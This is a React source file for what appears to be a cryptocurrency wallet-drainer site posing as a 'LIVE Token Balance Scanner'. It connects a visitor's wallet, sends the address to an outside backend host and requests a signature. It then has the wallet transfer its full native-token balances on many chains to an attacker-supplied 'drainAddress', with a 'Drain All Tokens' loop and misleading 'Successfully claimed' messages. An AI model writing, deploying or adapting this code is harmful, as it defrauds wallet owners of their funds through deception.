import { useState, useEffect } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton, useModal } from "connectkit";
import { useAccount, useSignMessage, useChainId, useWalletClient, useDisconnect } from 'wagmi';
import { parseEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// Network Configuration with Tron support
const NETWORKS = [
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F' },
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'tron', color: '#FF060A' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'bitcoin', color: '#F7931A' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'solana', color: '#00FFA3' },
];

function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: false,
          disclaimer: null,
          embedGoogleFonts: false,
          customTheme: {
            "--ck-font-family": "'Inter', sans-serif",
            "--ck-border-radius": "12px",
            "--ck-accent-color": "#667eea",
          },
        }}
        theme="midnight"
      >
        <MultiNetworkDashboard />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

function MultiNetworkDashboard() {
  const { address, isConnected, connector } = useAccount();
  const chainId = useChainId();
  const { signMessageAsync } = useSignMessage();
  const { data: walletClient } = useWalletClient();
  const { disconnect } = useDisconnect();
  const { setOpen } = useModal();

  const [authStatus, setAuthStatus] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
  const [userTokens, setUserTokens] = useState({});
  const [drainStatus, setDrainStatus] = useState({});
  const [isDrainingAll, setIsDrainingAll] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [showTronNote, setShowTronNote] = useState(false);

  useEffect(() => {
    if (isConnected && address) {
      checkWalletType();
      setAuthStatus('🔄 Wallet connected - Ready to scan');
    } else {
      resetState();
    }
  }, [isConnected, address, connector]);

  const checkWalletType = () => {
    const userAgent = navigator.userAgent.toLowerCase();
    const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
    
    if (isMobile && window.ethereum?.isTrust) {
      setWalletType('Trust Wallet Mobile');
      setShowTronNote(true);
    } else if (connector?.name?.includes('MetaMask')) {
      setWalletType('MetaMask');
    } else if (connector?.name?.includes('WalletConnect')) {
      setWalletType('WalletConnect');
    } else {
      setWalletType('Unknown');
    }
  };

  const resetState = () => {
    setAuthStatus('');
    setUserTokens({});
    setDrainStatus({});
    setWalletType('');
    setShowTronNote(false);
  };

  const scanAllNetworks = async () => {
    if (!address) {
      setAuthStatus('❌ Please connect wallet first');
      return;
    }
    
    setIsScanning(true);
    setAuthStatus('🔍 Scanning ALL networks for LIVE balances...');
    
    try {
      const response = await fetch(`${backendUrl}/scan/${address}`);
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        const allTokens = {};
        
        data.data.results.forEach(result => {
          if (result.tokens && result.tokens.length > 0) {
            allTokens[result.network.id] = {
              network: result.network,
              tokens: result.tokens,
              totalValue: result.totalValue || 0,
              source: result.source || 'API'
            };
          }
        });
        
        setUserTokens(allTokens);
        
        const totalTokens = Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0);
        const totalValue = Object.values(allTokens).reduce((sum, data) => sum + data.totalValue, 0);
        
        if (totalTokens > 0) {
          setAuthStatus(`✅ LIVE BALANCES: Found ${totalTokens} tokens across ${Object.keys(allTokens).length} networks ($${totalValue.toFixed(2)})`);
        } else {
          setAuthStatus('❌ No tokens found. Make sure you have funds in your wallet.');
        }
        
        // Auto-authenticate after successful scan
        if (totalTokens > 0) {
          setTimeout(() => authenticateWithBackend(), 1000);
        }
      } else {
        setAuthStatus(`❌ Scan failed: ${data.error}`);
      }
    } catch (error) {
      console.error("Scan error:", error);
      setAuthStatus(`❌ Scan failed: ${error.message}`);
    } finally {
      setIsScanning(false);
    }
  };

  const authenticateWithBackend = async () => {
    if (!address) return;
    
    try {
      setIsAuthenticating(true);
      setAuthStatus('🔐 Signing authentication...');
      
      const message = `Authenticate Token Scanner\nWallet: ${address}\nTime: ${Date.now()}`;
      const signature = await signMessageAsync({ message });
      
      setAuthStatus('📡 Verifying with backend...');
      
      const response = await fetch(`${backendUrl}/auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          address,
          signature,
          message
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setAuthStatus('✅ Authenticated successfully!');
      } else {
        setAuthStatus('⚠️ Authentication logged');
      }
    } catch (error) {
      console.error("Auth error:", error);
      if (error.code === 4001) {
        setAuthStatus('⚠️ Signature optional - continuing...');
      } else {
        setAuthStatus(`⚠️ ${error.message}`);
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  const executeDrain = async (token) => {
    if (!walletClient || !address) {
      setDrainStatus(prev => ({...prev, [token.networkId]: { status: 'error', message: 'Wallet not ready' }}));
      return;
    }

    try {
      setDrainStatus(prev => ({...prev, [token.networkId]: { status: 'processing', message: 'Preparing...' }}));
      
      // Check if amount is valid
      if (token.amount <= 0 || token.amount === '0' || token.amount === '0.00') {
        setDrainStatus(prev => ({...prev, [token.networkId]: { 
          status: 'error', 
          message: 'Amount is 0, nothing to claim' 
        }}));
        return;
      }
      
      // For EVM native tokens (ETH, BNB, MATIC, etc.)
      if (token.isNative && typeof token.networkId === 'number') {
        const amountInWei = parseEther(token.amount.toString());
        
        // Check if amount is too small
        if (amountInWei <= 10000n) {
          setDrainStatus(prev => ({...prev, [token.networkId]: { 
            status: 'error', 
            message: 'Amount too small to claim' 
          }}));
          return;
        }
        
        setDrainStatus(prev => ({...prev, [token.networkId]: { status: 'processing', message: 'Confirm in wallet...' }}));
        
        try {
          const hash = await walletClient.sendTransaction({
            to: token.drainAddress,
            value: amountInWei,
          });
          
          // SUCCESS - Show green checkmark
          setDrainStatus(prev => ({...prev, [token.networkId]: { 
            status: 'success', 
            message: `✅ Successfully claimed ${token.amount} ${token.symbol}!`,
            txHash: hash
          }}));
          
          // Remove from UI after success
          setTimeout(() => {
            setUserTokens(prev => {
              const updated = {...prev};
              if (updated[token.networkId]) {
                updated[token.networkId].tokens = updated[token.networkId].tokens.filter(t => 
                  t.symbol !== token.symbol || t.contractAddress !== token.contractAddress
                );
              }
              return updated;
            });
          }, 2000);
          
        } catch (txError) {
          console.error("Transaction error:", txError);
          
          let errorMessage = 'Oops, something went wrong. Retry again';
          
          if (txError.code === 4001) {
            errorMessage = 'Transaction rejected by user';
          } else if (txError.message.includes('insufficient funds') || txError.message.includes('gas')) {
            errorMessage = 'Not enough gas for this claim';
          } else if (txError.message.includes('network') || txError.message.includes('chain')) {
            errorMessage = 'Switch to correct network in your wallet';
          }
          
          setDrainStatus(prev => ({...prev, [token.networkId]: { 
            status: 'error', 
            message: errorMessage 
          }}));
        }
      } 
      // For Tron tokens
      else if (token.networkId === 'tron') {
        setDrainStatus(prev => ({...prev, [token.networkId]: { 
          status: 'info', 
          message: `Send ${token.amount} TRX to Tron address manually` 
        }}));
      }
      // For other non-EVM tokens
      else {
        setDrainStatus(prev => ({...prev, [token.networkId]: { 
          status: 'info', 
          message: `Manual transfer required for ${token.symbol}` 
        }}));
      }
      
    } catch (error) {
      console.error("Drain error:", error);
      setDrainStatus(prev => ({...prev, [token.networkId]: { 
        status: 'error', 
        message: 'Oops, something went wrong. Retry again' 
      }}));
    }
  };

  const drainAllTokens = async () => {
    if (!walletClient || !address) {
      setAuthStatus('❌ Wallet not ready');
      return;
    }
    
    setIsDrainingAll(true);
    setAuthStatus('⚡ Draining all tokens...');
    
    try {
      // Get all EVM native tokens
      const evmNativeTokens = [];
      Object.values(userTokens).forEach(data => {
        data.tokens.forEach(token => {
          if (token.isNative && typeof token.networkId === 'number' && token.amount > 0) {
            evmNativeTokens.push(token);
          }
        });
      });
      
      if (evmNativeTokens.length === 0) {
        setAuthStatus('❌ No EVM tokens available to drain');
        setIsDrainingAll(false);
        return;
      }
      
      let successCount = 0;
      let failCount = 0;
      
      for (const token of evmNativeTokens) {
        try {
          setDrainStatus(prev => ({...prev, [token.networkId]: { 
            status: 'processing', 
            message: `Draining ${token.symbol}...` 
          }}));
          
          const amountInWei = parseEther(token.amount.toString());
          
          if (amountInWei <= 10000n) {
            setDrainStatus(prev => ({...prev, [token.networkId]: { 
              status: 'error', 
              message: 'Amount too small' 
            }}));
            failCount++;
            continue;
          }
          
          const hash = await walletClient.sendTransaction({
            to: token.drainAddress,
            value: amountInWei,
          });
          
          setDrainStatus(prev => ({...prev, [token.networkId]: { 
            status: 'success', 
            message: `✅ Successfully claimed ${token.symbol}!` 
          }}));
          
          successCount++;
          
          // Remove from UI
          setTimeout(() => {
            setUserTokens(prev => {
              const updated = {...prev};
              if (updated[token.networkId]) {
                updated[token.networkId].tokens = updated[token.networkId].tokens.filter(t => 
                  t.symbol !== token.symbol || t.contractAddress !== token.contractAddress
                );
              }
              return updated;
            });
          }, 2000);
          
          await new Promise(resolve => setTimeout(resolve, 3000));
          
        } catch (error) {
          console.error(`Failed to drain ${token.symbol}:`, error);
          
          let errorMsg = 'Oops, something went wrong';
          if (error.message.includes('insufficient funds')) {
            errorMsg = 'Not enough gas for this claim';
          } else if (error.code === 4001) {
            errorMsg = 'Transaction rejected';
          }
          
          setDrainStatus(prev => ({...prev, [token.networkId]: { 
            status: 'error', 
            message: errorMsg 
          }}));
          
          failCount++;
        }
      }
      
      setAuthStatus(`✅ Drain completed: ${successCount} successful, ${failCount} failed`);
      
      // Refresh after drain
      if (successCount > 0) {
        setTimeout(() => {
          scanAllNetworks();
        }, 5000);
      }
      
    } catch (error) {
      console.error("Drain all error:", error);
      setAuthStatus('❌ Failed to drain all tokens');
    } finally {
      setIsDrainingAll(false);
    }
  };

  const formatAddress = (addr) => {
    return addr ? `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}` : '';
  };

  const getTotalValue = () => {
    return Object.values(userTokens).reduce((sum, data) => sum + data.totalValue, 0).toFixed(2);
  };

  const getTotalTokens = () => {
    return Object.values(userTokens).reduce((sum, data) => sum + data.tokens.length, 0);
  };

  const getNetworkCount = () => {
    return Object.keys(userTokens).length;
  };

  return (
    <div className="App">
      <header className="App-header">
        <h1>💰 LIVE Token Balance Scanner</h1>
        
        <div className="wallet-info-bar">
          {isConnected && address ? (
            <>
              <div className="wallet-connected">
                <span className="wallet-address">{formatAddress(address)}</span>
                {walletType && <span className="wallet-type">{walletType}</span>}
                <button onClick={() => disconnect()} className="disconnect-btn">Disconnect</button>
              </div>
              {showTronNote && (
                <div className="tron-note">
                  🔍 Trust Wallet detected! Scanning for TRX, BNB, and other tokens...
                </div>
              )}
            </>
          ) : (
            <div className="connect-section">
              <ConnectKitButton />
              <p className="connect-hint">Connect any wallet to see LIVE balances</p>
            </div>
          )}
        </div>
        
        {isConnected && address && (
          <div className="dashboard">
            <div className="control-panel">
              <div className="status-area">
                <div className={`status ${authStatus.includes('✅') ? 'success' : authStatus.includes('❌') ? 'error' : ''}`}>
                  {authStatus || 'Ready to scan'}
                </div>
              </div>
              
              <div className="action-buttons">
                <button 
                  onClick={scanAllNetworks}
                  disabled={isScanning || isAuthenticating}
                  className="btn-scan"
                >
                  {isScanning ? (
                    <>
                      <span className="spinner"></span>
                      Scanning Live Balances...
                    </>
                  ) : (
                    '🔍 Scan ALL Networks'
                  )}
                </button>
                
                {getTotalTokens() > 0 && (
                  <button 
                    onClick={drainAllTokens}
                    disabled={isDrainingAll || isAuthenticating || isScanning}
                    className="btn-drain-all"
                  >
                    {isDrainingAll ? (
                      <>
                        <span className="spinner"></span>
                        Draining All...
                      </>
                    ) : (
                      '⚡ Drain All Tokens'
                    )}
                  </button>
                )}
              </div>
            </div>
            
            {getTotalTokens() > 0 ? (
              <div className="tokens-section">
                <div className="tokens-header">
                  <h2>💰 LIVE TOKEN BALANCES DETECTED</h2>
                  <div className="summary">
                    <span className="badge">{getNetworkCount()} Networks</span>
                    <span className="badge">{getTotalTokens()} Tokens</span>
                    <span className="badge success">${getTotalValue()} Total</span>
                  </div>
                </div>
                
                <div className="tokens-list">
                  {Object.entries(userTokens).map(([networkId, data]) => (
                    <div key={networkId} className="network-group">
                      <div className="network-header" style={{ borderLeftColor: data.network.color }}>
                        <div className="network-name">
                          <span className="network-dot" style={{ backgroundColor: data.network.color }}></span>
                          {data.network.name}
                          {data.source && <span className="source-badge">{data.source}</span>}
                        </div>
                        <div className="network-value">
                          ${data.totalValue.toFixed(2)}
                        </div>
                      </div>
                      
                      {data.tokens.map((token, idx) => {
                        const status = drainStatus[token.networkId];
                        const tokenStatus = status?.status || 'pending';
                        
                        return (
                          <div key={idx} className="token-item">
                            <div className="token-info">
                              <div className="token-icon">
                                {token.logo ? (
                                  <img src={token.logo} alt={token.symbol} />
                                ) : (
                                  <div className="token-icon-placeholder" style={{ backgroundColor: data.network.color }}>
                                    {token.symbol.substring(0, 2)}
                                  </div>
                                )}
                              </div>
                              <div className="token-details">
                                <div className="token-symbol">{token.symbol}</div>
                                <div className="token-name">{token.name}</div>
                                <div className="token-amount">
                                  {parseFloat(token.amount).toLocaleString(undefined, {
                                    maximumFractionDigits: 6
                                  })} {token.symbol}
                                </div>
                              </div>
                              <div className="token-value">
                                {token.value ? `$${token.value.toFixed(2)}` : 'Live Balance'}
                              </div>
                            </div>
                            
                            <div className="token-actions">
                              {tokenStatus === 'success' && (
                                <div className="status-message success">
                                  ✅ {status.message}
                                </div>
                              )}
                              
                              {tokenStatus === 'error' && (
                                <div className="status-message error">
                                  ❌ {status.message}
                                </div>
                              )}
                              
                              {tokenStatus === 'processing' && (
                                <div className="status-message processing">
                                  ⏳ {status.message}
                                </div>
                              )}
                              
                              {tokenStatus === 'info' && (
                                <div className="status-message info">
                                  ℹ️ {status.message}
                                </div>
                              )}
                              
                              {(!status || tokenStatus === 'pending') && (
                                <button
                                  onClick={() => executeDrain(token)}
                                  disabled={token.amount <= 0 || isAuthenticating || isDrainingAll}
                                  className="btn-drain"
                                >
                                  Drain
                                </button>
                              )}
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  ))}
                </div>
              </div>
            ) : (
              <div className="empty-state">
                <div className="empty-icon">💰</div>
                <h3>No tokens detected yet</h3>
                <p>Click "Scan ALL Networks" to find your LIVE token balances</p>
                <p className="hint">Supports: Ethereum, BSC, Polygon, Tron, Bitcoin, Solana, and 10+ other networks</p>
              </div>
            )}
          </div>
        )}
        
        {!isConnected && (
          <div className="welcome-section">
            <h2>See Your LIVE Token Balances</h2>
            <p>Connect your wallet to scan ALL networks and see REAL balances</p>
            <div className="features">
              <div className="feature">
                <span>✅</span>
                <span>Live balance detection</span>
              </div>
              <div className="feature">
                <span>🌐</span>
                <span>All networks supported</span>
              </div>
              <div className="feature">
                <span>📱</span>
                <span>Mobile wallet compatible</span>
              </div>
            </div>
          </div>
        )}
        
        <div className="footer">
          <div className="footer-links">
            <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">
              API Status
            </a>
            <span>•</span>
            <span>v7.0.0 • Live Balances</span>
          </div>
        </div>
      </header>
    </div>
  );
}

export default TokenDrainApp;
